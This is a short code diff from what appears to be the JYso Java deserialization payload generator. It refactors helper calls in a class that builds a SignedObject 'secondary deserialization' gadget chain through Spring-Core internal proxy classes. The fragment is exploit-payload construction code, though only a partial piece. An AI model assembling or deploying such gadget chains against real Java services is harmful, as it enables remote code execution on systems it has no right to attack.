@@ -24,11 +24,10 @@ import java.lang.reflect.*;
 import java.math.BigInteger;
 import java.util.*;
 
-import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
-import static com.qi4l.JYso.gadgets.JDKUtil.makeMap;
 import static com.qi4l.JYso.gadgets.utils.Reflections.getFieldValue;
 import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
 import static com.qi4l.JYso.gadgets.utils.Serializer.serialize;
+import static com.qi4l.JYso.gadgets.utils.Utils.*;
 import static java.lang.Class.forName;
 
 /**
@@ -207,9 +206,9 @@ public class SignedObject implements ObjectPayload<Object> {
     // Spring-Core 二次反序列化
     public Object getSignedObjectWithSpring(Object serObj) throws Exception {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
-        ObjectFactory<?> objectFactoryProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", obj), ObjectFactory.class);
+        ObjectFactory<?> objectFactoryProxy = createMemoitizedProxy(createMap("getObject", obj), ObjectFactory.class);
         Type typeTemplatesProxy = createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
-        Object typeProviderProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
+        Object typeProviderProxy = createMemoitizedProxy(createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
         final Constructor<?> mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
         final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass"), 0);
